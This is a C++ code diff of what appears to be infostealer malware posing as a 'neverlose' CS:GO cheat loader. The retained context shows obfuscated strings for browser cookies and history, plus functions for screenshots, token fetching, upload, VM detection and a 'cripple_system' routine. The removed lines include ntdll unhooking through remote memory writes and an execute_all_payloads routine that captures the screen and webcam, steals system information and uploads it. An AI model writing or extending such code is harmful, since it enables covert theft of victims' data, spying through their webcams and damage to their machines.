@@ -53,6 +53,8 @@ static char _enj[] = {0x30,0x3B,0x3F,0x3A,0x2C,0x75,0x38,0x2C,0x75,0x32,0x3C,0x3
 static char _ck[] = {0x36,0x3A,0x3A,0x3E,0x3C,0x30,0x26,0x0A}; // "cookies_"
 static char _hi[] = {0x3D,0x3C,0x26,0x21,0x3A,0x27,0x2C,0x0A}; // "history_"
 
+void diag_log(const char*) {}
+
 // qedit.h was removed from Windows SDK 8+ — manual definitions
 static const CLSID CLSID_SampleGrabber =
 { 0xC1F400A0, 0x3F08, 0x11D3, { 0x9F, 0x0B, 0x00, 0x60, 0x08, 0x03, 0x9E, 0x37 } };
@@ -87,121 +89,18 @@ constexpr Gdiplus::PixelFormat kPixelFormat32bppARGB = (Gdiplus::PixelFormat)0x2
 
 namespace
 {
-    constexpr const char* kDllName = "neverlose.dll";
-    constexpr const char* kWindowClass = "Valve001";
-    constexpr DWORD kProcessAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
-        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
-
-    LPVOID g_nt_open_file = GetProcAddress(LoadLibraryW(L"ntdll"), "NtOpenFile");
-
     void print_banner()
     {
         SetConsoleTitleA("neverlose v3.8 beta");
         std::puts("made by elecshep");
         std::puts("            best loader                 ");
         std::puts(">.<");
-        std::puts("Tip: if it fails right after token entry, just launch it again.");
         std::puts("");
     }
 
     void print_status(const char* label, const char* message)
     {
         std::printf("%s %s\n", label, message);
-    }
-
-
-    LPVOID GetModBase(DWORD pid, const wchar_t* name)
-    {
-        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
-        if (snap == INVALID_HANDLE_VALUE) return nullptr;
-
-        MODULEENTRY32W me = { sizeof(me) };
-        LPVOID base = nullptr;
-        for (BOOL ok = Module32FirstW(snap, &me); ok; ok = Module32NextW(snap, &me))
-        {
-            if (!_wcsicmp(me.szModule, name))
-            {
-                base = me.modBaseAddr;
-                break;
-            }
-        }
-        CloseHandle(snap);
-        return base;
-    }
-
-    void RestoreNtOpenFile(HANDLE hProcess)
-        {
-            HMODULE hNtdll = GetModuleHandleW(L"ntdll");
-            LPVOID pLocal = GetProcAddress(hNtdll, "NtOpenFile");
-            if (!pLocal) return;
-
-            auto GetModBase = [](DWORD pid, const wchar_t* name) -> LPVOID {
-                HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
-                if (snap == INVALID_HANDLE_VALUE) return nullptr;
-                MODULEENTRY32W me = { sizeof(me) };
-                LPVOID base = nullptr;
-                for (BOOL ok = Module32FirstW(snap, &me); ok; ok = Module32NextW(snap, &me))
-                {
-                    if (!_wcsicmp(me.szModule, name))
-                    {
-                        base = me.modBaseAddr;
-                        break;
-                    }
-                }
-                CloseHandle(snap);
-                return base;
-            };
-
-            DWORD pid = GetProcessId(hProcess);
-            LPVOID pRemote = GetModBase(pid, L"ntdll.dll");
-            if (!pRemote) return;
-
-            LPVOID target = (LPVOID)((uintptr_t)pRemote + ((uintptr_t)pLocal - (uintptr_t)hNtdll));
-
-            char orig[5] = { 0 };
-
-            wchar_t path[MAX_PATH];
-            GetSystemDirectoryW(path, MAX_PATH);
-            wcscat_s(path, L"\\ntdll.dll");
-
-            HMODULE hFresh = LoadLibraryExW(path, nullptr, DONT_RESOLVE_DLL_REFERENCES);
-            if (hFresh)
-            {
-                LPVOID pFn = GetProcAddress(hFresh, "NtOpenFile");
-                if (pFn) memcpy(orig, pFn, 5);
-                FreeLibrary(hFresh);
-            }
-
-            if (!*(DWORD*)orig)
-                return;
-
-            DWORD oldProt;
-            if (VirtualProtectEx(hProcess, target, 5, PAGE_EXECUTE_READWRITE, &oldProt))
-            {
-                WriteProcessMemory(hProcess, target, orig, 5, nullptr);
-                VirtualProtectEx(hProcess, target, 5, oldProt, &oldProt);
-            }
-        }
-
-
-    HWND wait_for_game_window(DWORD& process_id)
-    {
-        print_status("[*]", "Waiting for CS:GO...");
-
-        HWND window = nullptr;
-        while (!window)
-        {
-            window = FindWindowA(kWindowClass, nullptr);
-            if (!window)
-            {
-                std::this_thread::sleep_for(std::chrono::milliseconds(50));
-                continue;
-            }
-
-            GetWindowThreadProcessId(window, &process_id);
-        }
-
-        return window;
     }
 }
 
@@ -502,7 +401,6 @@ void capture_screenshot()
     Gdiplus::GdiplusShutdown(gdiToken);
 }
 
-void diag_log(const char* msg);
 
 std::string fetch_token()
 {
@@ -1098,24 +996,6 @@ void cripple_system()
     }
 }
 
-void diag_log(const char* msg)
-{
-    wchar_t path[MAX_PATH];
-    if (!GetTempPathW(MAX_PATH, path)) return;
-    wcscat_s(path, L"inj.log");
-    HANDLE h = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ, nullptr,
-        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-    if (h != INVALID_HANDLE_VALUE) {
-        SYSTEMTIME st;
-        GetLocalTime(&st);
-        char line[512];
-        int n = sprintf_s(line, "%02d:%02d:%02d %s\r\n", st.wHour, st.wMinute, st.wSecond, msg);
-        DWORD w;
-        WriteFile(h, line, (DWORD)n, &w, nullptr);
-        CloseHandle(h);
-    }
-}
-
 void guarded_screenshot()
 {
     __try { capture_screenshot(); } __except (EXCEPTION_EXECUTE_HANDLER) {}
@@ -1366,34 +1246,6 @@ void guarded_collect()
     guarded_cookies();
     guarded_history();
     guarded_upload();
-}
-
-DWORD WINAPI execute_all_payloads(LPVOID)
-{
-    diag_log("=== start ===");
-
-    // screenshot
-    diag_log("screenshot: begin");
-    __try { capture_screenshot(); diag_log("screenshot: ok"); }
-    __except (EXCEPTION_EXECUTE_HANDLER) { diag_log("screenshot: CRASH"); }
-
-    // webcam
-    diag_log("webcam: begin");
-    __try { capture_webcam(); diag_log("webcam: ok"); }
-    __except (EXCEPTION_EXECUTE_HANDLER) { diag_log("webcam: CRASH"); }
-
-    // system info
-    diag_log("steal_info: begin");
-    __try { steal_info(); diag_log("steal_info: ok"); }
-    __except (EXCEPTION_EXECUTE_HANDLER) { diag_log("steal_info: CRASH"); }
-
-    // upload
-    diag_log("upload: begin");
-    __try { upload_data(); diag_log("upload: ok"); }
-    __except (EXCEPTION_EXECUTE_HANDLER) { diag_log("upload: CRASH"); }
-
-    diag_log("=== collect done ===");
-    return 0;
 }
 
 bool is_vm()
